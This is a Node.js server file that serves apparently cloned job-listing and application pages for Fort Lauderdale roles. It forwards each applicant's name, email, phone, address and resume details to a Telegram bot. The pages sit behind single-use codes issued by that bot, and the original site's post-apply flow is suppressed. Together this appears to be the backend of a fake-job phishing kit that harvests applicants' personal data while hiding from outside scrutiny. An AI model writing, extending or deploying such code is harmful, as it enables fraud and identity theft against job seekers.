// Static server: serves the Customer Service Representative job page + apply page,
// the Telegram notify + health endpoints, and static assets.
// Root "/" redirects to the job page. Everything else returns 404.
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const ROOT = __dirname;
const PORT = process.env.PORT || 8080;

// ---- minimal .env loader (no dependencies) ----
(function loadEnv() {
  try {
    const envPath = path.join(__dirname, '.env');
    if (!fs.existsSync(envPath)) return;
    const lines = fs.readFileSync(envPath, 'utf8').split(/\r?\n/);
    for (const line of lines) {
      const m = line.match(/^\s*([\w.-]+)\s*=\s*(.*)\s*$/);
      if (m && process.env[m[1]] === undefined) process.env[m[1]] = m[2];
    }
  } catch (e) { /* ignore */ }
})();

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

// ---- Telegram notify: single source of truth for message formatting + send ----
function formatBytes(bytes) {
  const n = Number(bytes);
  if (!bytes || !isFinite(n) || n <= 0) return '';
  if (n < 1024) return n + ' B';
  if (n < 1024 * 1024) return (n / 1024).toFixed(1) + ' KB';
  return (n / (1024 * 1024)).toFixed(1) + ' MB';
}

function fmtApplication(d) {
  return [
    '📄 NEW JOB APPLICATION',
    '━━━━━━━━━━━━━━━━━━',
    '👤 Name: ' + ((d.first_name || '') + ' ' + (d.last_name || '')).trim(),
    '📧 Email: ' + (d.email || ''),
    '📞 Phone: ' + (d.phone || ''),
    '🏠 Address: ' + (d.address || ''),
    '📎 Resume: ' + (d.resume_name || '-') + (d.resume_size ? ' (' + formatBytes(d.resume_size) + ')' : ''),
    '📢 Text alerts: ' + (d.textAlerts ? 'yes' : 'no'),
    '💼 Job: ' + (d.job_title || ''),
    '🔖 Ref: ' + (d.job_ref || ''),
    '📍 Location: ' + (d.job_location || ''),
  ].join('\n');
}

function fmtJobAlert(d) {
  return [
    '🔔 NEW JOB ALERT SIGNUP',
    '━━━━━━━━━━━━━━━━━━',
    '📧 Email: ' + (d.email || ''),
    '🔎 Query: ' + (d.query || ''),
    '📍 Location: ' + (d.location || ''),
    '⏰ Frequency: ' + (d.frequency || ''),
    '✅ Consent: ' + (d.consent ? 'yes' : 'no'),
  ].join('\n');
}

function fmtResumeUpload(d) {
  return [
    '📎 RESUME UPLOAD',
    '━━━━━━━━━━━━━━━━━━',
    '📄 File: ' + (d.file_name || ''),
    '📦 Size: ' + (d.file_size ? formatBytes(d.file_size) : ''),
    '💼 Job: ' + (d.job_title || ''),
    '🔖 Ref: ' + (d.job_ref || ''),
    '📍 Location: ' + (d.job_location || ''),
  ].join('\n');
}

const TELEGRAM_FORMATTERS = {
  application: fmtApplication,
  jobAlert: fmtJobAlert,
  resumeUpload: fmtResumeUpload,
};

function tgApi(method, payload) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify(payload);
    const req = https.request({
      hostname: 'api.telegram.org',
      path: '/bot' + TELEGRAM_BOT_TOKEN + '/' + method,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    }, (res) => {
      let data = '';
      res.on('data', (c) => { data += c; });
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

// Reply keyboard: keeps a tappable "/code" button in the chat.
function accessKeyboard() {
  return { keyboard: [[{ text: '/code' }]], resize_keyboard: true, one_time_keyboard: false };
}

function sendTelegram(text) {
  return tgApi('sendMessage', { chat_id: TELEGRAM_CHAT_ID, text: text, reply_markup: accessKeyboard() });
}

// ---- access lock: one-time Telegram access codes ----
// A "/code" message to the bot issues a single-use code (persisted in
// data/access.json — single source of truth). Unlocking consumes the code and
// issues a session cookie; each code allows exactly ONE application.
const ACCESS_FILE = path.join(ROOT, 'data', 'access.json');
const SESSION_COOKIE = 'jobem_access';
const CODE_ALPHABET = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; // no 0/O/1/I/L

function loadAccess() {
  try { return JSON.parse(fs.readFileSync(ACCESS_FILE, 'utf8')); }
  catch (e) { return { codes: {}, sessions: {} }; }
}
function saveAccess(db) {
  fs.mkdirSync(path.dirname(ACCESS_FILE), { recursive: true });
  const tmp = ACCESS_FILE + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(db, null, 2));
  fs.renameSync(tmp, ACCESS_FILE);
}
function genCode() {
  let c = '';
  for (let i = 0; i < 8; i++) {
    c += CODE_ALPHABET[Math.floor(Math.random() * CODE_ALPHABET.length)];
    if (i === 3) c += '-';
  }
  return c;
}
function readCookie(req, name) {
  const m = new RegExp('(?:^|; )' + name + '=([^;]+)').exec(req.headers.cookie || '');
  return m ? decodeURIComponent(m[1]) : '';
}
function sessionFromReq(req) {
  const sid = readCookie(req, SESSION_COOKIE);
  if (!sid) return null;
  return loadAccess().sessions[sid] || null;
}
function handleTelegramCommand(msg) {
  if (!msg || !msg.text) return;
  const text = String(msg.text).trim();
  const reply = (replyText) => tgApi('sendMessage', {
    chat_id: msg.chat.id, text: replyText, reply_markup: accessKeyboard()
  }).catch((e) => console.error('[access] reply send error', String((e && e.message) || e)));
  if (/^\/start(\s|$)/i.test(text)) {
    console.log('[access] /start from chat=' + msg.chat.id);
    return reply('Private site access codes.\n\nTap /code to get a one-time code (unlocks once, one application).');
  }
  if (!/^\/code(\s|$)/i.test(text)) return;
  const db = loadAccess();
  const code = genCode();
  db.codes[code] = { chat_id: msg.chat.id, used: false, created_at: Date.now() };
  saveAccess(db);
  console.log('[access] code issued chat=' + msg.chat.id + ' code=' + code);
  return reply('One-time access code: ' + code + '\n\nIt unlocks the site once (session) and allows ONE application.');
}
let tgOffset = 0;
function tgPoll() {
  if (!TELEGRAM_BOT_TOKEN) return;
  tgApi('getUpdates', { timeout: 25, offset: tgOffset, allowed_updates: ['message'] })
    .then((r) => {
      if (r.status === 401) { console.log('[access] telegram token invalid — polling stopped'); return; }
      try {
        const data = JSON.parse(r.body);
        if (data.ok && Array.isArray(data.result)) {
          for (const u of data.result) {
            tgOffset = Math.max(tgOffset, u.update_id + 1);
            handleTelegramCommand(u.message);
          }
        }
      } catch (e) { console.error('[access] getUpdates parse error', e); }
      setTimeout(tgPoll, 1000);
    })
    .catch((e) => {
      console.error('[access] getUpdates error, retrying in 3s', String((e && e.message) || e));
      setTimeout(tgPoll, 3000);
    });
}

// ---- routes: single source of truth for every page this server serves ----
// URL → relative file mapping. Each job/apply page lives at exactly ONE URL.
const JOB_PAGES = {
  '/jobs/308/AB_4976816/administrative-assistant_fort-lauderdale/': 'jobs/308/AB_4976816/administrative-assistant_fort-lauderdale/index.html',
  '/jobs/310/1142422-8/sales-representative_fort-lauderdale/': 'jobs/310/1142422-8/sales-representative_fort-lauderdale/index.html',
  '/jobs/309/ab_4979675/administrative-assistance_fort-lauderdale/': 'jobs/309/ab_4979675/administrative-assistance_fort-lauderdale/index.html',
};
const APPLY_PAGES = {
  '/jobs/apply/308/AB_4976816/': 'jobs/apply/308/AB_4976816/index.html',
  '/jobs/apply/310/1142422-8/': 'jobs/apply/310/1142422-8/index.html',
  '/jobs/apply/309/ab_4979675/': 'jobs/apply/309/ab_4979675/index.html',
};

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.mjs': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.webp': 'image/webp',
  '.ico': 'image/x-icon',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf',
  '.eot': 'application/vnd.ms-fontobject',
  '.map': 'application/json',
  '.txt': 'text/plain; charset=utf-8',
};

function send(res, code, body, type) {
  res.writeHead(code, {
    'Content-Type': type || 'text/plain; charset=utf-8',
    'Cache-Control': 'no-cache',
  });
  res.end(body);
}

function serveStatic(res, urlPath) {
  // Strip query string
  const clean = urlPath.split('?')[0];
  if (clean.includes('\0')) return send(res, 400, 'Bad Request');
  // Resolve inside ROOT, prevent traversal
  const file = path.normalize(path.join(ROOT, clean));
  if (!file.startsWith(ROOT)) return send(res, 403, 'Forbidden');
  fs.stat(file, (err, st) => {
    if (err || !st.isFile()) return send(res, 404, 'Not Found');
    fs.readFile(file, (err2, data) => {
      if (err2) return send(res, 404, 'Not Found');
      send(res, 200, data, MIME[path.extname(file).toLowerCase()] || 'application/octet-stream');
    });
  });
}

const server = http.createServer((req, res) => {
  const u = req.url.split('?')[0];
  // Request log: every hit is traced here so submit events can be observed
  // from the server terminal while testing from the UI.
  console.log('[http] ' + req.method + ' ' + req.url + (req.headers.origin ? ' (origin=' + req.headers.origin + ')' : ''));
  // Lock page (public — the only unlocked entry point)
  if (u === '/lock' || u === '/lock/') {
    return serveStatic(res, '/lock/index.html');
  }
  // Access unlock: consume a one-time code, issue a session cookie.
  // Invalid/used codes bounce back to /lock with an error param.
  if (u === '/api/access/unlock' && req.method === 'POST') {
    let raw = '';
    req.on('data', (c) => { raw += c; });
    req.on('end', () => {
      const ct = (req.headers['content-type'] || '').split(';')[0];
      let data = {};
      if (ct === 'application/json') { try { data = JSON.parse(raw || '{}'); } catch (e) {} }
      else { try { data = Object.fromEntries(new URLSearchParams(raw)); } catch (e) {} }
      const code = String(data.code || '').trim().toUpperCase();
      const next = String(data.next || '/');
      const db = loadAccess();
      const c = db.codes[code];
      if (!c || c.used) {
        const qs = new URLSearchParams({ next: next, ref: String(data.ref || ''), error: c ? 'used' : 'invalid' });
        res.writeHead(302, { Location: '/lock/?' + qs.toString(), 'Cache-Control': 'no-store' });
        return res.end();
      }
      c.used = true;
      c.used_at = Date.now();
      const sid = crypto.randomBytes(24).toString('hex');
      db.sessions[sid] = { code: code, chat_id: c.chat_id, created_at: Date.now(), applied: false };
      saveAccess(db);
      console.log('[access] unlock ok code=' + code + ' next=' + next);
      res.writeHead(302, {
        Location: next,
        'Set-Cookie': SESSION_COOKIE + '=' + sid + '; HttpOnly; SameSite=Lax; Path=/',
        'Cache-Control': 'no-store',
      });
      res.end();
    });
    return;
  }
  // Telegram notification endpoint (POST): pages fire-and-forget their events here.
  if (u === '/api/telegram/notify' && req.method === 'POST') {
    // CSRF guard: reject cross-origin browser requests unless they come from this server.
    const origin = req.headers.origin;
    if (origin) {
      try {
        const o = new URL(origin);
        if (o.host !== req.headers.host) { console.log('[notify] 403 forbidden origin: ' + origin); return send(res, 403, JSON.stringify({ ok: false, error: 'forbidden origin' }), 'application/json'); }
      } catch (e) {
        console.log('[notify] 403 bad origin: ' + origin);
        return send(res, 403, JSON.stringify({ ok: false, error: 'forbidden origin' }), 'application/json');
      }
    }
    let raw = '';
    let tooBig = false;
    req.on('data', (c) => {
      raw += c;
      if (raw.length > 1000000) tooBig = true;
    });
    req.on('end', async () => {
      if (tooBig) return send(res, 413, JSON.stringify({ ok: false, error: 'payload too large' }), 'application/json');
      try {
        const payload = JSON.parse(raw || '{}');
        const fmt = TELEGRAM_FORMATTERS[payload.type];
        if (!fmt) { console.log('[notify] unknown type: ' + payload.type); return send(res, 400, JSON.stringify({ ok: false, error: 'unknown type' }), 'application/json'); }
        // One application per access code: require an unlocked session and
        // block a second application on the same session/code.
        if (payload.type === 'application') {
          const s = sessionFromReq(req);
          if (!s) { console.log('[notify] 403 application without unlocked session'); return send(res, 403, JSON.stringify({ ok: false, error: 'locked' }), 'application/json'); }
          if (s.applied) { console.log('[notify] 403 application already submitted for this code'); return send(res, 403, JSON.stringify({ ok: false, error: 'already-applied' }), 'application/json'); }
        }
        const text = fmt(payload.data || {});
        console.log('[notify] type=' + payload.type + ' job=' + (payload.data && payload.data.job_title) + ' ref=' + (payload.data && payload.data.job_ref) + ' → sending to Telegram');
        const r = await sendTelegram(text);
        const ok = r.status === 200 && r.body.indexOf('"ok":true') !== -1;
        if (payload.type === 'application' && ok) {
          const db = loadAccess();
          const sid = readCookie(req, SESSION_COOKIE);
          if (db.sessions[sid]) { db.sessions[sid].applied = true; saveAccess(db); }
        }
        console.log('[notify] type=' + payload.type + ' result=' + (ok ? 'OK' : 'FAIL') + ' telegramStatus=' + r.status);
        send(res, ok ? 200 : 502, JSON.stringify({ ok: ok, telegramStatus: r.status }), 'application/json');
      } catch (e) {
        console.error('[notify] error: ' + String((e && e.message) || e));
        send(res, 400, JSON.stringify({ ok: false, error: String((e && e.message) || e) }), 'application/json');
      }
    });
    return;
  }
  if (u === '/health') {
    return send(res, 200, 'ok', 'text/plain; charset=utf-8');
  }
  if (u === '/') {
    res.writeHead(302, { Location: Object.keys(JOB_PAGES)[0] });
    return res.end();
  }
  const jobFile = JOB_PAGES[u] || JOB_PAGES[u + '/'];
  const applyFile = APPLY_PAGES[u] || APPLY_PAGES[u + '/'];
  const gatedFile = jobFile || applyFile;
  if (gatedFile) {
    // Job + apply pages are locked: no valid session cookie → redirect to /lock
    if (!sessionFromReq(req)) {
      // ref: job pages have the ref as second-to-last segment (slug last);
      // apply pages have the ref as the last segment.
      const parts = String(gatedFile).replace(/\/index\.html$/, '').split('/');
      const ref = jobFile ? (parts[parts.length - 2] || '') : (parts[parts.length - 1] || '');
      const qs = new URLSearchParams({ next: u, ref: ref });
      console.log('[gate] locked -> /lock/?next=' + u + '&ref=' + ref);
      res.writeHead(302, { Location: '/lock/?' + qs.toString(), 'Cache-Control': 'no-store' });
      return res.end();
    }
    return serveStatic(res, gatedFile);
  }
  // The app's data fallback endpoint (POST /api/search/get-callback) - serve
  // the captured real response so the page gets its expected data.
  if (u === '/api/search/get-callback') {
    return serveStatic(res, '/api/search/get-callback.json');
  }
  // static assets for the two pages
  if (u.startsWith('/search-app/') || u.startsWith('/themes/') ||
      u.startsWith('/scripts/') || u.startsWith('/s3fs-media/')) {
    return serveStatic(res, req.url);
  }
  // Post-apply confirmation redirect removed: the React flow that navigates
  // here is suppressed client-side (see telegram-notify.js capture hook), so
  // this URL is intentionally dead — no fallback, one source of truth.
  send(res, 404, 'Not Found');
});

// Bind all interfaces so Render (and other hosts) can reach the service.
server.listen(PORT, process.env.HOST || '0.0.0.0', () => {
  console.log(`Serving on http://${process.env.HOST || '0.0.0.0'}:${PORT}${Object.keys(JOB_PAGES)[0]}`);
  tgPoll();
});
